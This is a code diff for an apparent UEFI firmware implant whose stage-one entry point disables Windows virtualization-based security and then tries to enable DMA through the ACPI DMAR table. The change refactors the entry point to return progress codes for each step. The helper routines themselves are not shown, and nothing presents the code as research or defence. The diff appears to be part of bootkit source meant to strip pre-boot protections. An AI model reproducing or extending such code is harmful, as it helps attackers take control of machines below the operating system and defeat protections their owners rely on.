@@ -10,6 +10,10 @@
 
 #include "Common.h"
 
+#define PROG_NON		0
+#define PROG_VBS_DISABLE	1
+#define PROG_DMA_ENABLED	2
+
 /*!
  *
  * Purpose:
@@ -21,17 +25,14 @@
 !*/
 D_SEC( A ) EFI_STATUS EFIAPI Entry_Stage1( _In_ EFI_SYSTEM_TABLE* SystemTable )
 {
-	EFI_STATUS	Est = EFI_SUCCESS;
-
-	/* Toggle off virtualization based security */
-	Est = VbsDisable( SystemTable );
+	UINT32		Prg = PROG_NON;
 
 	/* Did we succeed?! */
-	if ( Est == EFI_SUCCESS ) {
+	if ( VbsDisable( SystemTable ) == EFI_SUCCESS ) {
 		/* Look for the ACPI DMAR Table */
-		Est = AcpiEnableDma( SystemTable );
+		Prg = AcpiEnableDma( SystemTable ) == EFI_SUCCESS ? PROG_DMA_ENABLED : PROG_VBS_DISABLE;
 	};
 
 	/* Return the status */
-	return Est;
+	return Prg;
 };
